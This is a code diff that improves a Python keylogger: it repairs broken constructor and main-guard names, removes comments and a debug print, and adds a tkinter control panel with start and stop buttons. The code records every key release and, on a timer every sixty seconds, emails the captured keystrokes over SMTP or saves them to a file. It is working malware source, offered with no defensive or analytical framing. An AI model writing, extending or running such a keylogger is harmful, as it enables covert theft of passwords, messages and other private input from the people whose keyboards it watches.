@@ -1,16 +1,18 @@
-import keyboard  # for keylogs
-import smtplib  # for sending email using SMTP protocol (gmail)
-from threading import Timer  # Timer is to make a method runs after an interval amount of time
+import keyboard
+import smtplib
+from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+import tkinter as tk
+from tkinter import messagebox
 
-SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = 60
 EMAIL_ADDRESS = ""
 EMAIL_PASSWORD = ""
 
 class Keylogger:
-    def _init_(self, interval, report_method="email"):
+    def __init__(self, interval, report_method="email"):
         self.interval = interval
         self.report_method = report_method
         self.log = ""
@@ -73,17 +75,38 @@ class Keylogger:
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             elif self.report_method == "file":
                 self.report_to_file()
-            print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True
         timer.start()
 
-if _name_ == "_main_":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+class KeyloggerGUI:
+    def __init__(self, master):
+        self.master = master
+        master.title("Keylogger Control")
+        self.keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
 
-    keyboard.on_release(keylogger.callback)
-    keylogger.report()  # Start the reporting process
-    keyboard.wait()
+        self.label = tk.Label(master, text="Keylogger Control Panel")
+        self.label.pack(pady=10)
+
+        self.start_button = tk.Button(master, text="Start Keylogger", command=self.start_keylogger)
+        self.start_button.pack(pady=5)
+
+        self.stop_button = tk.Button(master, text="Stop Keylogger", command=self.stop_keylogger)
+        self.stop_button.pack(pady=5)
+
+    def start_keylogger(self):
+        self.keylogger.start_dt = datetime.now()
+        keyboard.on_release(self.keylogger.callback)
+        self.keylogger.report()
+        messagebox.showinfo("Info", "Keylogger started.")
+
+    def stop_keylogger(self):
+        keyboard.unhook_all()
+        messagebox.showinfo("Info", "Keylogger stopped.")
+
+if __name__ == "__main__":
+    root = tk.Tk()
+    gui = KeyloggerGUI(root)
+    root.mainloop()
